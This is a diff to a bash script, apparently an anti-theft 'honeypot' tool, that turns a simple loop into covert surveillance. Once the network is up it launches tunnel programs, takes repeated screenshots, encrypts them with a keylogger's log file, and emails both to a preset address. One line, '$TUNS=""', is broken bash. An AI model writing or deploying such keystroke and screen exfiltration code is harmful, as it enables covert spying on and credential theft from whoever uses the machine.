@@ -1,12 +1,67 @@
 #!/bin/bash
 
-TICK="10"
+TMPDIR="/tmp"
+TICK="5"
+STATUS=""
+TUNS=$(ls /usr/local/bin | grep tun_)
+PHOTO_PACKAGE_ROOT="/tmp/yaourt-tmp-root/scrot/package/"
 
-function payload {
-	echo -n "." >> /var/log/tarspoon.log
+NAME="$(cat /usr/local/etc/tarspoon/receiver.name)"
+MAIL="$(cat /usr/local/etc/tarspoon/receiver.mail)"
+
+function cheese {
+	sleep $(($1*$1*56)); scrot "${PHOTO_PACKAGE_ROOT}/${RANDOM}.png"
 }
 
+function send_darth_maul_to_take_some_photos {
+	echo "$(date)> maul: hide your kids, hide your wives" >> /var/log/tarspoon/tarspoon.log
+
+	cd ${PHOTO_PACKAGE_ROOT}/..
+	tar -czf maul.tgz package/ >/dev/null 
+	rm package/* 
+	cd -	
+
+	for tt in {0..4} ; do
+		cheese $tt &
+	done
+
+}
+
+function call_home {
+	echo "$(date)> call: returning the favor" >> /var/log/tarspoon/tarspoon.log
+
+	rm /root/*gpg 
+	gpg -eo /root/maul.gpg -r "$NAME" ${PHOTO_PACKAGE_ROOT}/../maul.tgz
+	gpg -eo /root/keys.gpg -r "$NAME" /var/log/logkeys.log
+	echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/maul.gpg -s "${STATUS} M4UL $(date)" -b "$MAIL"
+	echo "sent from h0n3yp07 v0.1.0" |mutt -a /root/keys.gpg -s "${STATUS} K3YZ $(date)" -b "$MAIL"
+}
+
+function rocket {
+	echo "$(date)> rocket: checking for network" >> /var/log/tarspoon/tarspoon.log
+
+	# Stage one: waiting for the network to go up
+	STATUS=$(curl icanhazip.com 2>/dev/null)
+	TICK=$((5+$TICK))
+	[[ -z $STATUS ]] && return
+	
+	# We're here iff we're on the network
+	TICK="15m"
+
+	[[ ! -z $TUNS ]] && for x in $TUNS; do /usr/local/bin/$x & done
+	$TUNS=""
+
+	echo "$(date)> rocket: all systems green" >> /var/log/tarspoon/tarspoon.log
+
+	send_darth_maul_to_take_some_photos
+
+	call_home
+}
+
+# Prepare environment here
+mkdir -p $PHOTO_PACKAGE_ROOT
+echo "$(date)> booted up $(cat /etc/hostname)" >> /var/log/tarspoon/tarspoon.log
 while true; do
-	payload
+	rocket
 	sleep $TICK
 done
